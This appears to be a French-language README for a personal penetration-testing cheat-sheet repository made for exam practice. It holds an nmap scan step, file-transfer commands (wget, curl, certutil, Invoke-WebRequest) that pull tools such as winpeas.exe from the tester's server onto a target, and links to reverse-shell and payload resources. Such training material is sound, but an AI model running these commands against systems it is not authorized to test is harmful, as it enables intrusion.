# hkmv
All tools i need to start explore, have fun :)

Commandes prêtes à l'emploi, organisées par phase d'attaque.
Fichiers
01_recon_enum — Scanner, énumérer (Nmap, Gobuster, SMB, FTP, SSH)
02_exploitation — Exploiter (SQLi, Hydra, Metasploit, LFI, Burp)
03_privesc_linux — Escalader sur Linux (sudo, SUID, cron, capabilities)
04_privesc_windows — Escalader sur Windows (services, tokens, PowerShell)
05_reverse_shells — Obtenir un shell (Bash, Python, PHP, PowerShell, msfvenom)
06_post_exploitation — Après accès (loot, transfert fichiers, hashcat, pivot)




==========================================================
Premiers réflexes -- J1 
1. Créer la structure de travail
mkdir -p ~/exam/{screenshots,loot,notes}

2. Noter l'IP cible
export IP=10.10.10.10

3. Lancer le scan
nmap -sV -sC $IP -oN ~/exam/notes/scan.txt

4. Pendant le scan — noter les infos de base
echo "Target : $IP" >> ~/exam/notes/notes.txt

==========================================================
Transfert de fichiers
Serveur HTTP 
cd /chemin/vers/fichier
python3 -m http.server 8080


Télécharger sur la cible 
# Linux
wget http://TON_IP:8080/fichier
curl http://TON_IP:8080/fichier -o fichier

# Windows
certutil -urlcache -split -f http://TON_IP:8080/fichier.exe C:\Temp\fichier.exe
ex : certutil -urlcache -split -f http://10.10.10.10:8080/winpeas.exe C:\Temp\winpeas.exe

Invoke-WebRequest -Uri http://TON_IP:8080/fichier.exe -OutFile C:\Temp\fichier.exe
ex : Invoke-WebRequest -Uri http://10.10.10.10:8080/winpeas.exe -OutFile C:\Temp\winpeas.exe

==========================================================





       BESOIN                                   URL
BesoinURLPrivesc Linux                 https://gtfobins.github.ioPrivesc 
Windows                                https://lolbas-project.github.io
Générer un reverse shell               https://www.revshells.com
Cracker un hash en ligne               https://crackstation.net
Identifier un hash                     https://hashes.com/en/tools/hash_identifier
Payloads & bypasses                    https://github.com/swisskyrepo/PayloadsAllTheThings
Wordlists                              https://github.com/danielmiessler/SecLists
CVE & exploits                         https://www.exploit-db.com
CVE détails                            https://nvd.nist.gov
CyberChef (encode/decode)              https://gchq.github.io/
CyberChefHackTricks (méthodologie)     https://book.hacktricks.xyz
GTFOBins pour Active Directory         https://wadcoms.github.io
Guides pratiques par technique         https://www.hackingarticles.in
Reverse shells et checklists           https://pentestmonkey.net
